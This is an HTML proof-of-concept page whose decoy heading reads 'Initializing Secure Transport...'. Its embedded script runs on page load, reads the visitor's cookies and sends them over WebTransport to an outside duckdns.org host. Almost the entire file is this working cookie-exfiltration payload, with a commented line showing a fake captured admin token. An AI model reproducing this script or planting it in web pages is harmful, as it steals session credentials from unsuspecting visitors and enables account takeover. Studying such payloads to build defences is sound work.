<!DOCTYPE html>
<html>
<head>
    <title>WebTransport PoC</title>
</head>
<body>
    <h1>Initializing Secure Transport...</h1>
    <script>
        async function runExfil() {
    const url = 'https://webrtc-poc.duckdns.org';
    
    try {
        const transport = new WebTransport(url);
        await transport.ready;

        // --- THE DATA GATHERING PART ---
        // Let's try to grab all cookies as a test
        let sensitiveData = document.cookie || "No Cookies Found";
        
        // If you want to test with a hardcoded string again:
        // sensitiveData = "user_auth=CAPTURED_ADMIN_TOKEN_999";

        const stream = await transport.createUnidirectionalStream();
        const writer = stream.getWriter();
        const data = new TextEncoder().encode(sensitiveData);
        
        await writer.write(data);
        await writer.close();
        
    } catch (e) {
        console.error("Exfil failed:", e);
    }
}
        // Trigger on page load
        runExfil();
    </script>
</body>
</html>
